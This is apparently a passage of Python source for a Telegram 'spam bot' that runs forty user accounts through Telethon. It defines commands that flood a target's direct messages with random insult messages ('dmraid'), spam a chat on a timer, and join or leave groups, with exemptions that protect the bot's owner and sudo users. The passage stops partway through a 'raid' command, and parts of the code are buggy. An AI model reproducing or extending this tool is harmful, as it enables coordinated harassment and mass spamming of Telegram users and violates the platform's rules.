@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
async def dm(e):   
        usage = "**MODULE NAME** : **DM**\n\n command: \n\n .dm <username> <massage> \n .dm <reply to the use> <massage>"
        if e.sender_id not in SUDO_USERS or e.sender_id not in DEV:
               return
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        RiZoeL = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(RiZoeL) == 2:
            user = str(RiZoeL[0])
            a = await e.client.get_entity(user)
            g = a.id
            if int(g) in RiZoeLX:
                text = f"I can't Dm To @RiZoeLX's Owner"
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                 message = str(RiZoeL[1])
                 await e.reply("🔸Message Delivered🔸")
                 await e.client.send_message(g, message)
                 await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            if int(g) in RiZoeLX:
                text = f"I can't Dm To @RiZoeLX's Owner"
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                message = str(RiZoeL[0])
                await e.reply("🔸 Message Delivered 🔸")
                await e.client.send_message(g, message)
                await asyncio.sleep(0.3)

        else:
             await e.reply(usage)


@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sdmraid(?: |$)(.*)" % hl))
async def dmraid(e):
        usage = "**MODULE NAME** : **DM RAID**\n\n command: \n\n .dmraid <count> <username> \n .dmraid <reply to the use> <massage>"
        if e.sender_id not in SUDO_USERS or e.sender_id not in DEV:
              return
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        RiZoeL = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        bitxh = await e.get_reply_message()
        if len(RiZoeL) == 2:
            user = str(RiZoeL[1])
            a = await e.client.get_entity(user)
            g = a.id
            if int(g) in RiZoeLX:
                text = f"I can't Dm To @RiZoeLX's Owner"
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                counter = int(RiZoeL[0])
                await e.reply("⚜️ Dm Raid Strated Successfully ⚜️")
                for _ in range(counter):
                    reply = random.choice(RAID)
                    caption = f"{reply}"
                    await e.client.send_message(g, caption)
                    await asyncio.sleep(0.4)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            if int(g) in RiZoeLX:
                text = f"I can't Dm To @RiZoeLX's Owner"
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                counter = int(RiZoeL[0])
                await e.reply("⚜️ Dm Raid Strated Successfully!! ⚜️")
                for _ in range(counter):
                    reply = random.choice(RAID)
                    caption = f"{reply}"
                    await e.client.send_message(g, caption)
                    await asyncio.sleep(0.3)
        else:
            await e.reply(usage)

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
async def join(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **Time Spam**\n\nCommand:\n\n`{hl}tspam` <time in seconds> <count> <message to spam>\n\n`{hl}tspam` <time in Seconds> <count> <reply to a message>"     
    e.chat_id = rizol
    if e.sender_id in SUDO_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        smex = await e.get_reply_message()
        Rizoel = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
        RizoelOk = Rizoel[1:]
        if len(RizoelOk) == 2:
            message = str(RizoelOk[1])
            if re.search(TheRiZoeL.lower(), message.lower()):
                return await e.reply("**Sorry !!** I can't Spam On @RiZoeLX's owner")
            if int(e.chat_id) in GROUP:
                return await e.reply("Sorry !! I can't spam here")
            counter = int(RizoelOk[0])
            spamtime = int(Rizoel[0])
            hehe = await e.reply(f"Spam Will Start in {spamtime}secs")
            await asyncio.sleep(spamtime)
            await hehe.edit("**Time Over ⚠️** Starting spam.")
            for _ in range(counter):
                 if e.reply_to_msg_id:
                     await smex.reply(message)
                 else:
                    await e.client.send_message(rizol, message)
                 await asyncio.sleep(0.4)
        elif e.reply_to_msg_id and smex.media:
            counter = int(RizoelOk[0])
            sleeptime = float(Rizoel[0])
            for _ in range(counter):
                await asyncio.sleep(spamtime)
                async with e.client.action(rizol, "document"):
                    smex = await e.client.send_file(rizol, smex, caption=smex.text)
                    await gifspam(e, smex)
                await asyncio.sleep(0.5)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            if re.search(TheRiZoeL.lower(), message.lower()):
                return await e.reply("**Sorry !!** I can't Spam On @RiZoeLX's owner")
            if int(e.chat_id) in GROUP:
                return await e.reply("Sorry !! I can't spam here")
            counter = int(RizoelOk[0])
            sleeptime = float(Rizoel[0])
            hehe = await e.reply(f"Spam Will Start in {spamtime}secs")
            await asyncio.sleep(spamtime)
            await hehe.edit("**Time Over ⚠️** Starting spam.")
            for _ in range(counter):
                await e.client.send_message(rizol, message)
                await asyncio.sleep(0.4)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)
# join leave

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sjoin(?: |$)(.*)" % hl))
async def join(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n{hl}join <Public Channel or Group Link/Username>"
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            bc = rizoel[0]
            text = "Joining..."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(functions.channels.JoinChannelRequest(channel=bc))
                await event.edit("Joined Successfully ✅")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%spjoin(?: |$)(.*)" % hl))
async def privatejoin(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n{hl}pjoin <Private Group link or access hash>"
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = rizoel[0]
            if bc.startswith("https://t.me/+"):
                hash = bc.split('/t.me/+')[1]
                grp = bc
            text = "Joining...."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(ImportChatInviteRequest(grp))
                await event.edit("Joined Successfully (Private Group/channel) ✅")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sleave(?: |$)(.*)" % hl))
async def leave(e):
    if e.sender_id in DEV:
        rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = rizoel[0]
            if bc.startswith("https://t.me/") or bc.startswith("@"):
               if re.search(GRP.lower(), bc.lower()):
                   return await e.reply("**Sorry !!** I can't Leave That Group")
               k = await e.client.get_entity(bc)
               id = k.id
            elif bc.startswith("-100"):
                id = int(bc)
                if int(id) in GROUP:
                    return await e.reply("Sorry! I can't Leave This Group")
            text = "Leaving....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
               await event.client(LeaveChannelRequest(id))
               await event.edit("Succesfully Left ✅")
            except Exception as e:
               await event.edit(str(e))
         
        else:
             bc = e.chat_id
             if int(bc) in GROUP:
                text = f"I can't Leave This Grp"
                await e.reply(text, parse_mode=None, link_preview=None )
             else:
                 Xd = int(bc)
                 text = "Leaving....."
                 if e.is_private:
                       dik = f"You Can't Do this Here !! \n\n {hl}leave <chat id or Username> \n {hl}leave : type in the group bot will auto leave that group !"
                       await e.reply(dik, parse_mode=None, link_preview=None )
               
                 else:
                      event = await e.reply(text, parse_mode=None, link_preview=None )
                      try:
                          await event.client(LeaveChannelRequest(Xd))
                      except Exception as e:
                           await event.edit(str(e))
    if e.sender_id in SUDO_USERS:
            await e.reply("Only Full Sudo Users Can Do That Noob !!")

# Raid cmds #

que = {}
@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
